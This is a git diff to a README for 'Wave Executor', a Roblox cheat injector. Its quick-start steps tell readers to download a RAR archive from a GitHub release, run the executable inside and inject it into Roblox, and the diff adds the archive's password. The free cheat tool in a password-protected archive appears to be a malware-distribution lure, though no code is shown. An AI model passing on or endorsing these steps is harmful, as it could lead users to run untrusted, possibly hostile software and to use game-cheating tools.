@@ -26,7 +26,7 @@ Unlock new possibilities in Roblox with **Wave Executor** — a powerful and mod
 ## 🚀 Quick Start Guide  
 
 1. **Download** the latest version from [here](https://github.com/HesSkull/WaveLauncher/releases/download/roblox/WaveLauncher.rar).  
-2. **Extract & Run** the executable file.  
+2. **Extract & Run** the executable file.  __**(The password for the archive is WaveFREE)**__
 3. **Launch Roblox** and inject the executor to start scripting.  
 
 ---  
